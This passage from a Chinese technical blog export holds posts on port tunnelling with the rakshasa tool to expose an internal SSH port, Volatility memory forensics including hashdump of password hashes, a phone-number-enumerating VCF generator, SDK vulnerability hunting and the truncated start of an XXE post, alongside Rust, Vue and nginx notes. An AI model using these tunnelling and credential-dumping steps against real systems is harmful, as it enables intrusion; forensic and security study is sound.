<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@10.20.20.88 bin]# ls</span><br><span class="line">rakshasa_fullnode_amd64_darwin       rakshasa_fullnode_amd64_lite_linux    rakshasa_fullnode_lite_amd64_darwin   rakshasa_node_amd64_darwin   rakshasa_node_lite_amd64_darwin</span><br><span class="line">rakshasa_fullnode_amd64_linux        rakshasa_fullnode_amd64_lite_win.exe  rakshasa_fullnode_lite_amd64_linux    rakshasa_node_amd64_linux    rakshasa_node_lite_amd64_linux</span><br><span class="line">rakshasa_fullnode_amd64_lite_darwin  rakshasa_fullnode_amd64_win.exe       rakshasa_fullnode_lite_amd64_win.exe  rakshasa_node_amd64_win.exe  rakshasa_node_lite_amd64_win.exe</span><br></pre></td></tr></table></figure>

<p>根据操作系统，把文件拷贝到对应的服务端和客户端</p>
<p>在服务端执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@42.13.23.62 ~]# ./rakshasa_fullnode_amd64_linux -p 7549 -nocli</span><br></pre></td></tr></table></figure>

<p>在客户端执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@10.20.20.88 bin]#./rakshasa_fullnode_amd64_linux -bind 127.0.0.1:22,0.0.0.0:7548 -d 42.13.23.62:7549  --nocli</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解释一下，这两条命令就是把 本机【10.20.20.88】的【22】端口映射到【42.13.23.62】的【7548】端口，7549只是客户端和服务端通讯的端口</p>
</blockquote>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>我们在我们自己的机器上打开一个powershell（带有ssh命令的）<br>连接我们的【42.13.23.62】的【7548】端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\test\Desktop&gt; ssh root@42.13.23.62 -p 7548</span><br><span class="line">The authenticity of host &#x27;[42.13.23.62]:7548 ([42.13.23.62]:7548)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:8R2q3T2OpJoAFPB0rFZWYySoBzQLzjubaf63UO+Dwc8.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;[42.13.23.62]:7548&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">Authorized only. All activity will be monitored and reported</span><br><span class="line">root@42.13.23.62&#x27;s password:</span><br><span class="line">Last login: Sun Apr 23 09:16:00 2023 from localhost</span><br><span class="line">[root@mail ~]$ pwd</span><br></pre></td></tr></table></figure>


<p>连接成功</p>
]]></content>
  </entry>
  <entry>
    <title>rust入门导航</title>
    <url>/2024/08/10/rust%E5%85%A5%E9%97%A8%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<h3 id="Rust语言圣经"><a href="#Rust语言圣经" class="headerlink" title="Rust语言圣经"></a>Rust语言圣经</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://course.rs/about-book.html</span><br></pre></td></tr></table></figure>

<h3 id="awesome-rust"><a href="#awesome-rust" class="headerlink" title="awesome-rust"></a>awesome-rust</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rust-unofficial/awesome-rust</span><br></pre></td></tr></table></figure>

<h3 id="练习中学习"><a href="#练习中学习" class="headerlink" title="练习中学习"></a>练习中学习</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://rustwiki.org/zh-CN/rust-by-example/</span><br></pre></td></tr></table></figure>

<h3 id="练习网站"><a href="#练习网站" class="headerlink" title="练习网站"></a>练习网站</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://exercism.org/tracks/rust/exercises/hello-world</span><br><span class="line">https://zh.practice.rs/ownership/ownership.html</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>rust</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>rust国内源设置</title>
    <url>/2024/08/16/rust%E5%9B%BD%E5%86%85%E6%BA%90%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><h4 id="步骤一：设置-Rustup-镜像，-修改配置-zshrc-or-bashrc"><a href="#步骤一：设置-Rustup-镜像，-修改配置-zshrc-or-bashrc" class="headerlink" title="步骤一：设置 Rustup 镜像， 修改配置 ~&#x2F;.zshrc or ~&#x2F;.bashrc"></a>步骤一：设置 Rustup 镜像， 修改配置 ~&#x2F;.zshrc or ~&#x2F;.bashrc</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export RUSTUP_DIST_SERVER=&quot;https://rsproxy.cn&quot;</span><br><span class="line">export RUSTUP_UPDATE_ROOT=&quot;https://rsproxy.cn/rustup&quot;</span><br></pre></td></tr></table></figure>

<h4 id="步骤二：安装-Rust（请先完成步骤一的环境变量导入并-source-rc-文件或重启终端生效）"><a href="#步骤二：安装-Rust（请先完成步骤一的环境变量导入并-source-rc-文件或重启终端生效）" class="headerlink" title="步骤二：安装 Rust（请先完成步骤一的环境变量导入并 source rc 文件或重启终端生效）"></a>步骤二：安装 Rust（请先完成步骤一的环境变量导入并 source rc 文件或重启终端生效）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://rsproxy.cn/rustup-init.sh | sh</span><br></pre></td></tr></table></figure>

<h4 id="步骤三：设置-crates-io-镜像，-修改配置-cargo-config，已支持git协议和sparse协议，-1-68-版本建议使用-sparse-index，速度更快。"><a href="#步骤三：设置-crates-io-镜像，-修改配置-cargo-config，已支持git协议和sparse协议，-1-68-版本建议使用-sparse-index，速度更快。" class="headerlink" title="步骤三：设置 crates.io 镜像， 修改配置 ~&#x2F;.cargo&#x2F;config，已支持git协议和sparse协议，&gt;&#x3D;1.68 版本建议使用 sparse-index，速度更快。"></a>步骤三：设置 crates.io 镜像， 修改配置 ~&#x2F;.cargo&#x2F;config，已支持git协议和sparse协议，&gt;&#x3D;1.68 版本建议使用 sparse-index，速度更快。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">replace-with = &#x27;rsproxy-sparse&#x27;</span><br><span class="line">[source.rsproxy]</span><br><span class="line">registry = &quot;https://rsproxy.cn/crates.io-index&quot;</span><br><span class="line">[source.rsproxy-sparse]</span><br><span class="line">registry = &quot;sparse+https://rsproxy.cn/index/&quot;</span><br><span class="line">[registries.rsproxy]</span><br><span class="line">index = &quot;https://rsproxy.cn/crates.io-index&quot;</span><br><span class="line">[net]</span><br><span class="line">git-fetch-with-cli = true</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>vcf通讯具生成小工具</title>
    <url>/2024/09/10/vcf%E9%80%9A%E8%AE%AF%E5%85%B7%E7%94%9F%E6%88%90%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suffix = [1737124,1737125,1737126,1737127,1737128,1737129,1737106,1737107,1737108,1737109,1737142,1737143,1737144,1737145,1737148,1737149,1737196,1737197,1737198,1737199,1739600,1739601,1739602,1739603,1739604,1739605,1739606,1739607,1739608,1739609,1739610,1739611,1739612,1739613,1739614,1739615,1739616,1739617,1739618,1739998,1739820]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out = open(&#x27;hw.vcf&#x27;,&#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">for ps in suffix:</span><br><span class="line">    for i in range(10):</span><br><span class="line">        for j in range(10):</span><br><span class="line">            phone = str(ps)+str(i)+str(j)+str(72)</span><br><span class="line"></span><br><span class="line">            out.writelines(&#x27;BEGIN:VCARD\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;VERSION:2.1\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;N:;&#x27;+phone+&#x27;;;;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;FN:&#x27;+phone+&#x27;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;TEL;CELL:&#x27;+phone+&#x27;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;END:VCARD\n&#x27;)</span><br><span class="line">out.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>sdk类漏洞挖掘</title>
    <url>/2024/09/10/sdk%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>找各类开放平台，搜索SDK，然后下载，解压看里面是否存在有存在漏洞的组件<br><img src="/images/blog/376027f20a3c2c1df2f9cdca44c7259e.png"></p>
<p><img src="/images/blog/f153c57a179163e5300d6c8ddd482e5a.png"></p>
<p>如下站点汇总了各大公司SDK信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sdk.caict.ac.cn/official/#/home</span><br></pre></td></tr></table></figure>

<p><img src="/images/blog/ae8e0a129680a3e6a82627aa7a3c08b9.png"></p>
]]></content>
  </entry>
  <entry>
    <title>vmware中ubuntu虚拟机没有wired图标连不上无线网</title>
    <url>/2024/09/10/vmware%E4%B8%ADubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B2%A1%E6%9C%89wired%E5%9B%BE%E6%A0%87%E8%BF%9E%E4%B8%8D%E4%B8%8A%E6%97%A0%E7%BA%BF%E7%BD%91/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/NetworkManager/NetworkManager.conf 将managed=False改成True</span><br><span class="line"></span><br><span class="line">service network-manager stop</span><br><span class="line"></span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state </span><br><span class="line"></span><br><span class="line">service network-manager start</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>vmware共享文件夹不显示</title>
    <url>/2024/09/10/vmware%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8D%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse .host:/ /mnt/ -o nonempty -o allow_other</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>vue keepAlive 页面缓存+部分页面缓存</title>
    <url>/2024/09/10/vue-keepAlive-%E9%A1%B5%E9%9D%A2%E7%BC%93%E5%AD%98-%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h3 id="0x1-keepAlive"><a href="#0x1-keepAlive" class="headerlink" title="0x1 keepAlive"></a>0x1 keepAlive</h3><p>有如下【笔记】功能，目的是想【新增笔记】后返回列表页面刷新页面，在查看笔记后返回列表页面时不刷新。<br><img src="/images/blog/f7b9bc54ac94ff532f90b94e2adb7234.png"></p>
<h3 id="0x2-路由配置"><a href="#0x2-路由配置" class="headerlink" title="0x2 路由配置"></a>0x2 路由配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">          path: &quot;notice&quot;,</span><br><span class="line">          name: &quot;notice&quot;,</span><br><span class="line">          redirect: &#123; name: &#x27;noticeindex&#x27; &#125;,</span><br><span class="line">          meta: &#123; keepAlive: true &#125;,</span><br><span class="line">          component: () =&gt; import(&quot;../views/src/notice/core.vue&quot;),</span><br><span class="line">          children: [</span><br><span class="line">            &#123;</span><br><span class="line">              path: &quot;noticeindex&quot;,</span><br><span class="line">              name: &quot;noticeindex&quot;,</span><br><span class="line">              meta: &#123; keepAlive: true &#125;,</span><br><span class="line">              component: () =&gt; import(&quot;../views/src/notice/notice_index.vue&quot;),</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              path: &quot;edit/:id&quot;,</span><br><span class="line">              name: &quot;editNotice&quot;,</span><br><span class="line">              meta: &#123; keepAlive: true &#125;,</span><br><span class="line">              component: () =&gt; import(&quot;../views/src/notice/notice_edit.vue&quot;),</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              path: &quot;view/:id&quot;,</span><br><span class="line">              name: &quot;viewNotice&quot;,</span><br><span class="line">              meta: &#123; keepAlive: false &#125;,</span><br><span class="line">              component: () =&gt; import(&quot;../views/src/notice/notice_view.vue&quot;),</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              path: &quot;new&quot;,</span><br><span class="line">              name: &quot;newNotice&quot;,</span><br><span class="line">              meta: &#123; keepAlive: true &#125;,</span><br><span class="line">              component: () =&gt; import(&quot;../views/src/notice/notice_new.vue&quot;),</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-core-vue"><a href="#0x3-core-vue" class="headerlink" title="0x3 core.vue"></a>0x3 core.vue</h3><p>如下是vue3 vue-router 4.0版本的写法 vue2有区别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;router-view v-slot=&quot;&#123; Component &#125;&quot;&gt;</span><br><span class="line">        &lt;keep-alive&gt;</span><br><span class="line">            &lt;component :is=&quot;Component&quot; v-if=&quot;$route.meta.keepAlive&quot; :key=&quot;$route.name&quot; /&gt;</span><br><span class="line">        &lt;/keep-alive&gt;</span><br><span class="line">        &lt;component :is=&quot;Component&quot; v-if=&quot;!$route.meta.keepAlive&quot; :key=&quot;$route.name&quot; /&gt;</span><br><span class="line">    &lt;/router-view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<h3 id="0x4-notice-index-vue"><a href="#0x4-notice-index-vue" class="headerlink" title="0x4 notice_index.vue"></a>0x4 notice_index.vue</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  components: &#123; SearchOutlined, ReadOutlined, MdEditor &#125;,</span><br><span class="line"></span><br><span class="line">  beforeRouteEnter(to, from, next) &#123;</span><br><span class="line">    // to.meta.keepAlive = false</span><br><span class="line">    console.log(&#x27;index &#x27;, &#x27;to.name:&#x27;, to.name, &#x27; from.name:&#x27;, from.name)</span><br><span class="line">    from.meta.keeplive = false;</span><br><span class="line">    next()</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteLeave(to, from, next) &#123;</span><br><span class="line">    to.meta.keepAlive = false</span><br><span class="line">    next()</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  activated() &#123;</span><br><span class="line">    if (!this.$route.meta.isBack) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 从新设置页面得路由元信息</span><br><span class="line">    this.$route.meta.isBack = false</span><br><span class="line">  &#125;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">  &#125;</span><br><span class="line">return&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="0x5-notice-new-vue"><a href="#0x5-notice-new-vue" class="headerlink" title="0x5 notice_new.vue"></a>0x5 notice_new.vue</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">    components: &#123; SearchOutlined, ReadOutlined, MdEditor &#125;,</span><br><span class="line">    beforeRouteLeave(to, from, next) &#123;</span><br><span class="line">        console.log(&#x27;index &#x27;, &#x27;to.name:&#x27;, to.name, &#x27; from.name:&#x27;, from.name)</span><br><span class="line">        if (this.hasEdit) &#123;</span><br><span class="line">            to.meta.keepAlive = false</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            to.meta.keepAlive = true</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        next()</span><br><span class="line">    &#125;,</span><br><span class="line">    setup() &#123;</span><br><span class="line">        const router = useRouter();</span><br><span class="line">        let viewNotice: Notice = reactive(&#123;&#125;)</span><br><span class="line">        let cid = router.currentRoute.value.params.cid as string;</span><br><span class="line">        let hasEdit = ref(false)</span><br><span class="line">        const onReturn = () =&gt; &#123;</span><br><span class="line">            router.push(&#123; name: &quot;notice&quot; &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//当保存内容后，标志设为true表示需要刷新列表业页</span><br><span class="line">        const onSave = () =&gt; &#123;</span><br><span class="line">                    hasEdit.value = true</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>volatility工具内存取证</title>
    <url>/2024/09/10/volatility%E5%B7%A5%E5%85%B7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h3 id="获取内存镜像的摘要信息"><a href="#获取内存镜像的摘要信息" class="headerlink" title="获取内存镜像的摘要信息"></a>获取内存镜像的摘要信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure>
<p>判断系统版本应该是 Win7SP1x64</p>
<h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><p>pslist 可以直接列出运行的进程，如果进程已经结束，会在 Exit 列显示日期和时间，表明进程已经结束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>

<h3 id="查看隐藏进程"><a href="#查看隐藏进程" class="headerlink" title="查看隐藏进程"></a>查看隐藏进程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pstree</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 psxview</span><br></pre></td></tr></table></figure>

<h3 id="列举缓存在内存的注册表"><a href="#列举缓存在内存的注册表" class="headerlink" title="列举缓存在内存的注册表"></a>列举缓存在内存的注册表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>

<h3 id="提取主机名"><a href="#提取主机名" class="headerlink" title="提取主机名"></a>提取主机名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提取自启动项"><a href="#提取自启动项" class="headerlink" title="提取自启动项"></a>提取自启动项</h3><p>提取内存中保留的 cmd 命令使用情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure>
<p>获取到当时的网络连接情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 netscan</span><br><span class="line">````</span><br><span class="line">### 提取 ip 地址和主机名</span><br></pre></td></tr></table></figure>
<p>volatility -f name –profile&#x3D;WinXPSP2x86 netscan | grep ESTABLISHED</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userassist 键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</span><br></pre></td></tr></table></figure>
<p>volatility -f name –profile&#x3D;WinXPSP2x86 userassist</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 获取 SAM 表中的用户 ：</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">显示每个进程的加载 dll 列表</span><br></pre></td></tr></table></figure>
<p>Volatility -f name -profile &#x3D; Win7SP0x86 dlllist&gt; dlllist.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 扫描内存中的文件</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">filescan 也可以结合 grep 命令来进行筛选，比如</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan | grep “doc|docx”<br>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan | grep “flag”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 提取 flag 值</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x07f1b6c10 –dump-dir&#x3D;.&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 提取内存中保留的 cmd 命令使用情况</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 cmdline</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 提取出内存中记录的 当时正在运行的程序</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.vmem –profile&#x3D;Win7SP1x64 userassist</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 提取网络连接情况</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 netscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 提取 IE 浏览器历史</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 iehistory</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 提取系统密码（hashdump）</span><br><span class="line">直接 hashdump</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 hashdump</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">注册表 system 的 virtual 地址</span><br><span class="line">SAM 的 virtual 地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dump 出来密码</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.vmem –profile&#x3D;Win7SP1x64 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）<br>volatility -f mem.vmen –profile&#x3D;Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000867010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 提取迁移后的进程编号</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 malfind</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 提取开机自启项的 Virtual 地址</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce”<br>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p>
<pre><code>
### 参考
https://blog.csdn.net/qq_60115503/article/details/124818819
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>vue+nginx使用gizp实在首屏加载速度优化</title>
    <url>/2024/09/10/vue-nginx%E4%BD%BF%E7%94%A8gizp%E5%AE%9E%E5%9C%A8%E9%A6%96%E5%B1%8F%E5%8A%A0%E8%BD%BD%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>我的工程使用的是vue-cli生成的工程 vue create project_name,然后再顶层目录新建了一个vue.config.js,后续部分配置需要写在这里面</p>
<h4 id="0x1-环境"><a href="#0x1-环境" class="headerlink" title="0x1 环境"></a>0x1 环境</h4><blockquote>
<p>CentOS Linux release 7.9.2009 (Core)<br>Vue 3<br>Vue router 4.*<br>nginx version: nginx&#x2F;1.20.1<br>compression-webpack-plugin ^6.1.1</p>
</blockquote>
<h4 id="0x2-vue配置"><a href="#0x2-vue配置" class="headerlink" title="0x2 vue配置"></a>0x2 vue配置</h4><p>首先安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install compression-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure>

<h5 id="vue-config-js配置"><a href="#vue-config-js配置" class="headerlink" title="vue.config.js配置"></a>vue.config.js配置</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const CompressionPlugin = require(&#x27;compression-webpack-plugin&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  outputDir: process.env.outputDir,</span><br><span class="line">  lintOnSave: false,</span><br><span class="line">  productionSourceMap: false,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      &quot;/api&quot;: &#123;</span><br><span class="line">        target: &quot;http://127.0.0.1:7788&quot;,</span><br><span class="line">        changeOrigin: true,</span><br><span class="line">        //   ws: true,</span><br><span class="line">        // rewrite:(path) =&gt; path.replace(/^\/api/,&#x27;&#x27;)</span><br><span class="line">        pathRewrite: &#123;</span><br><span class="line">          &quot;^/api&quot;: &quot;&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  configureWebpack: config =&gt; &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      plugins: [</span><br><span class="line">        new CompressionPlugin(&#123;</span><br><span class="line">          algorithm: &#x27;gzip&#x27;, // 使用gzip压缩</span><br><span class="line">          test: /\.js$|\.html$|\.css$/, // 匹配文件名</span><br><span class="line">          minRatio: 1, // 压缩率小于1才会压缩</span><br><span class="line">          threshold: 10240, // 对超过10k的数据压缩</span><br><span class="line">          deleteOriginalAssets: false,</span><br><span class="line">        &#125;)</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>vue配置好后直接使用命令编译就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>


<h4 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h4><p>在&#x2F;etc&#x2F;nginx&#x2F;nginx.conf 的http中加入如下配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line"></span><br><span class="line">include /usr/share/nginx/modules/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile            on;</span><br><span class="line">    tcp_nopush          on;</span><br><span class="line">    tcp_nodelay         on;</span><br><span class="line">    keepalive_timeout   65;</span><br><span class="line">    types_hash_max_size 4096;</span><br><span class="line"></span><br><span class="line">    include             /etc/nginx/mime.types;</span><br><span class="line">    default_type        application/octet-stream;</span><br><span class="line">    gzip_static on;</span><br><span class="line">    gzip  on;</span><br><span class="line">    gzip_proxied any;</span><br><span class="line">    gzip_min_length  1k;</span><br><span class="line">    gzip_buffers     4 16k;</span><br><span class="line">    gzip_http_version 1.0;</span><br><span class="line">    gzip_comp_level 5;</span><br><span class="line">    gzip_types text/plain application/javascript application/css text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;</span><br><span class="line">    gzip_vary on;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       82;</span><br><span class="line">        listen       [::]:82;</span><br><span class="line">        server_name  _;</span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把npm编译好的文件放（dist）到 nginx对应的root 目录下即可。<br>如下图未压缩是2.6M ，压纹后600KB。<br><img src="/images/blog/a762fbfbfc4ee92e36d521d50c14e61e.png"></p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe漏洞利用</title>
    <url>/2024/09/10/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h4 id="0x0-excel探测"><a href="#0x0-excel探测" class="headerlink" title="0x0 excel探测"></a>0x0 excel探测</h4><p>解压xlsx<br><img src="/images/blog/15cc9e50a61198544d367cda33d318ca.png"></p>
